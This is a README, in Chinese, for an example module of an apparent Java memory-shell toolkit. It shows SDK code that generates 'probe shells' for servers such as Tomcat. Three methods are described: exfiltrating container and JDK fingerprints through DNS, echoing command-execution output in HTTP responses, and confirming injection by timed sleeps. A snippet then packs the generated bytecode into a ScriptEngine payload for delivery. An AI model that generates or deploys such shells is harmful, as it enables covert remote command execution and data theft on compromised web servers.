# memshell-party-example-probe

演示**回显马（探测马）**的 SDK 用法：目标上还没有内存马时，先用回显马摸清目标环境
（容器版本、JDK、命令是否可执行、能否出网），再决定打什么内存马。

回显马生成引擎在 `memshell-party-core` 里，**不依赖任何 server 模块**（各容器的
writer / filter probe / payload 模板都在 core 的 `probe.payload` 包里，按
`ResponseBodyConfig.server(...)` 的名字查表）。桌面 GUI 有"探测马"页、REST/MCP 有
`generate_probe_shell`，走的都是同一个引擎，本示例展示 SDK 层的写法。

## 三种探测方法

| main | probeMethod | 用途 | 触发方式 |
|---|---|---|---|
| `DnsLogProbe` | `DNSLog` | 目标出网探测 + 环境指纹外带（`ProbeContent.Server` 回传容器信息 / `JDK` 回传 JDK 信息） | 命中即向 `DnsLogConfig.host` 发起 DNS 查询 |
| `ResponseBodyProbe` | `ResponseBody` | 不出网场景：命令执行结果直接写进 HTTP 响应体（`ProbeContent.Command`） | 命中即回显，`reqParamName` 为触发参数 |
| `SleepProbe` | `Sleep` | 无回显场景：注入点是否真实执行的时延验证 | 命中即睡眠 `seconds` 秒 |

## 怎么生成

```java
ProbeConfig probeConfig = ProbeConfig.builder()
        .probeMethod(ProbeMethod.ResponseBody)
        .probeContent(ProbeContent.Command)
        .shrink(true)   // 缩小字节码
        .debug(false)   // 关闭调试信息
        .build();

ResponseBodyConfig responseBodyConfig = ResponseBodyConfig.builder()
        .server(Tomcat)
        .reqParamName("payload")
        .build();

ProbeShellResult result = ProbeShellGenerator.generate(probeConfig, responseBodyConfig);
```

产物与内存马一致：`shellClassName` / `shellBytes` / `shellBytesBase64Str`，
可随手用已有的 packer 打包投递：

```java
String payload = Packers.ScriptEngine.getInstance().pack(ClassPackerConfig.of(
        result.getShellClassName(), result.getShellBytes(), result.getShellBytesBase64Str(),
        result.getProbeConfig() != null && result.getProbeConfig().needByPassJavaModule()));
```

## 运行测试

```
./gradlew :memshell-party-examples:memshell-party-example-probe:test
```

- 三种探测马都能生成，产物字段齐备（类名非空、字节非空、base64 与字节一致）；
- 生成结果能被已有 packer 打包；
- 只依赖 core：对没有引入 server 模块的容器（如 Jetty）也能生成 ResponseBody 探测马。
- 真实容器的注入与回显验证见 `integration-test`（如 `Tomcat8SleepServerContainerTest`），
  示例测试只锁生成期契约，保持快速。
